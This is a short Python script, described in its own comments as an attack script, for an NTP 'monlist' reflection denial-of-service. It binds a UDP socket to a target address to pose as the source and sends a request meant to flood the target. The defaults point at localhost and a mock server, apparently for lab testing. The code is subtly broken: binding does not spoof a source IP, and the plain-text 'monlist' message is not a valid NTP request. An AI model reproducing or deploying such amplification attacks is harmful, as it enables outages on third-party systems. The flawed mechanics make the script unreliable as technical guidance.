import socket

# This will be our attack script.

def spoofed_request(target_ip, target_port, ntp_server_ip, ntp_server_port):
    message = "monlist"  # The command that would trigger a large response.

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set the source IP to our target's IP
    sock.bind((target_ip, target_port))

    # Send the spoofed request to the NTP server
    sock.sendto(message.encode(), (ntp_server_ip, ntp_server_port))

    sock.close()

if __name__ == "__main__":
    TARGET_IP = "127.0.0.1"  # Replace with your target IP.
    TARGET_PORT = 8081  # The port your web server is running on.
    NTP_SERVER_IP = "localhost"  # For testing, we're running the NTP server locally.
    NTP_SERVER_PORT = 123  # The port your mock NTP server is running on.

    # Send the spoofed request.
    # You may need to run this with appropriate permissions or change the ports to higher ones.
    print("sending DoS of MONLIST UDP result stream to (IP, port): (" + (TARGET_IP) + ", " + str(TARGET_PORT) + ")")
    spoofed_request(TARGET_IP, TARGET_PORT, NTP_SERVER_IP, NTP_SERVER_PORT)

